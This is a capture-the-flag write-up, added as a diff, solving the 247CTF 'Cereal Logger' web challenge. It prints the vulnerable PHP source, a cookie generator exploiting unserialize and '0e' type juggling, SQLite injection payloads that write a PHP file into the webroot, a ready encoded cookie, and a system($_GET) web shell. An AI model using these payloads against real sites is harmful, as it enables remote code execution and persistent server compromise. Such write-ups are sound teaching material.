@@ -1,0 +1,99 @@
+### Cereal Logger (Hard)
+---
+
+This has to be my favourite web challenge on 247ctf so far. I constructed the challenge locally, and that really helped me understand what i was doing right and wrong. I highly sugest to try this challenge by yourself before reading my writeup. Kudos to Chivato, check out his work:
+
+`https://twitter.com/SecGus`
+
+`https://hackmd.io/@Chivato`
+
+By viewing the web page webpage we see the source code of the site:
+
+```
+<?php
+
+  class insert_log
+  {
+      public $new_data = "Valid access logged!";
+      public function __destruct()
+      {
+          $this->pdo = new SQLite3("/tmp/log.db");
+          $this->pdo->exec("INSERT INTO log (message) VALUES ('".$this->new_data."');");
+      }
+  }
+
+  if (isset($_COOKIE["247"]) && explode(".", $_COOKIE["247"])[1].rand(0, 247247247) == "0") {
+      file_put_contents("/dev/null", unserialize(base64_decode(explode(".", $_COOKIE["247"])[0])));
+  } else {
+      echo highlight_file(__FILE__, true);
+  }
+```
+
+After reviewing the code i noticed the `unserialized` function accepts user input from our cookie. We can exploit the `unserialized` function because the object is not referenced again in the code and will execute the `__destruct()` function. So all we need to do is create a serialized object with the class name of `insert_log` and provide our own value of `new_data`. This obviously leads to SQL injection as `$this->pdo->exec()` is not a prepared statement.
+
+First the code checks if a cookie with a name `247` is set. Then it goes through the `explode` function. Our cookie will then have two parts. This will be determined by a period. To pass the `if` statement the second part of our cookie must be equal to `0`, but the second part of our cookie has a random number concatenated to it, making it almost impossible to  pass.
+
+Thats where type juggling comes into play, i noticed that it checks the values with double equals and not triple, meaning we can pass something like this:
+
+"0e1337" == "0" and will produce True.
+
+<img src="images/image16.png" width="400">
+
+So far our cookie will look something like this: `serialized_object.0e`
+
+Now lets start constructing our exploit code. Like i said before we can provide a base64 encoded serialized object as the first part of our cookie, and once it is pass to the `unserialize` function the `__destruct()` function will go off. I wrote a simple php script that will create this object, where i can easily change the value of `$new_data` that will lead us to exploiting the SQL injection.
+```
+<?php
+
+class insert_log
+  {
+      public $new_data;
+      function __construct($data) {
+        $this->new_data = $data;
+    }
+  }
+$injection = "injection here";
+$obj = new insert_log($injection);
+echo urlencode(base64_encode(serialize($obj)).".0e");
+echo "\n";
+```
+
+<img src="images/image16.png" width="400">
+
+Now i can provide `$injection` and it will echo the urlencoded base64 encoded serialized object. Plus have "0e" concatenated at the end to bypass the first check.
+
+<img src="images/image17.png" width="400">
+
+I looked a bit online and found a nice injection from PayloadAllTheThings, i have modified it a bit so it is just a PoC and not a webshell (plus i assume the webroot is at `/var/www/html/`):
+
+```
+ATTACH DATABASE '/var/www/html/saint.php' AS saint;
+CREATE TABLE saint.barber (data text);
+INSERT INTO saint.barber (data) VALUES ('<?php echo <pre>; system('whoami'); ?>');--
+```
+
+This will create a SQLite database file and insert `system('whoami')` into a table named `saint` and column named `barber`. Because the database file will be named `saint.php` any php code in the file will be rendered in the browser leading us to remote code execution.
+
+So our `$injection` will look something like this: 
+
+`'); ATTACH DATABASE '/var/www/html/saint.php' AS saint; CREATE TABLE saint.barber (data text); INSERT INTO saint.barber (data) VALUES ('<?php echo \"<pre>\"; system(\"whoami\");?>');-- -`
+
+This is the cookie for the above injection:
+ `TzoxMDoiaW5zZXJ0X2xvZyI6MTp7czo4OiJuZXdfZGF0YSI7czoxODI6IicpOyBBVFRBQ0ggREFUQUJBU0UgJy92YXIvd3d3L2h0bWwvc2FpbnQucGhwJyBBUyBzYWludDsgQ1JFQVRFIFRBQkxFIHNhaW50LmJhcmJlciAoZGF0YSB0ZXh0KTsgSU5TRVJUIElOVE8gc2FpbnQuYmFyYmVyIChkYXRhKSBWQUxVRVMgKCc8P3BocCBlY2hvICI8cHJlPiI7IHN5c3RlbSgid2hvYW1pIik7Pz4nKTstLSAtIjt9.0e`
+
+Once we provide the cookie and go to `saint.php` we notice `www-data`. 
+
+<img src="images/image18.png" width="500">
+
+Now lets go for a web shell by adding `system($_GET['saint'])`. Note that the table and column has already been creating. If we try the same injection we will get an error from SQLite. So our next injection will look something like this: 
+
+`'); ATTACH DATABASE '/var/www/html/saint.php' AS saint; INSERT INTO saint.barber (data) VALUES ('<?php echo \"<pre>\"; system(\$_GET[\"saint\"]);?>');-- -`
+
+<img src="images/image19.png" width="600">
+
+And there we go, web shell by exploiting the unserialize function in php and sql injection. After looking around the system i found the flag in the `log.db` database file from the source code.
+
+<img src="images/image20.png" width="600">
+
+---
+#### sAINT_barber
